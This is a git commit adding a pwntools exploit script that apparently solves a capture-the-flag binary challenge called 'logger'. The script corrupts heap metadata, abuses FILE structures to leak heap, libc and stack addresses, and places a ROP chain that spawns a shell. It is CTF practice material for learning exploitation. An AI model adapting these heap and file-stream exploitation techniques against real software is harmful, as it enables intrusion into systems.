41770156e0a88ff673f63ce7c95b865746583be9
segfault; son of binexp; house of einherjar <zoverin@proton.me>
2025-11-04 13:13:07 -0500

    add some challs

---
+++ flagyard/logger/xpl.py
@@ -0,0 +1,42 @@
+#!/usr/bin/env python3
+from pwn import *
+
+exe = context.binary = ELF(args.EXE or './logger')
+libc = ELF(exe.libc.path)
+
+def write(idx, data):
+    io.sendlineafter(b">> ", b"1")
+    io.sendlineafter(b": ", str(idx).encode())
+    io.sendafter(b": ", data)
+
+def write2file(idx):
+    io.sendlineafter(b">> ", b"2")
+    io.sendlineafter(b": ", str(idx).encode())
+
+def deletefile(idx):
+    io.sendlineafter(b">> ", b"3")
+    io.sendlineafter(b": ", str(idx).encode())
+
+io = process(exe.path)
+
+for i in range(2): write(i, b"A"*0x10)
+write2file(0)
+
+write(0, b"A"*104 + p64(0x1050 | 1))
+write(1, (b"A"*104 + p64(0x1e0 | 1) + p64(0xfbad2c80)).ljust(224, b'\x00') + p64(0x1))
+write2file(1)
+
+heap_base = u64(io.recv(136)[120:128].ljust(8, b'\x00')) - 0x1570
+libc.address = u64(io.recvline()[192:200]) - libc.sym._IO_file_jumps
+
+write(1, b"A"*104 + p64(0x1050 | 1) + FileStructure().write(libc.sym.environ, 0x2000))
+write2file(1)
+
+stack_leak = u64(io.recvline()[0:8])
+
+write(2, p64(libc.address + 0x10f75b) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.address + 0x2882f) + p64(libc.sym.system))
+write(1, b"A"*104 + p64(0x1050 | 1) + FileStructure().read(stack_leak - 336, 0x100))
+
+write2file(2)
+
+io.interactive()
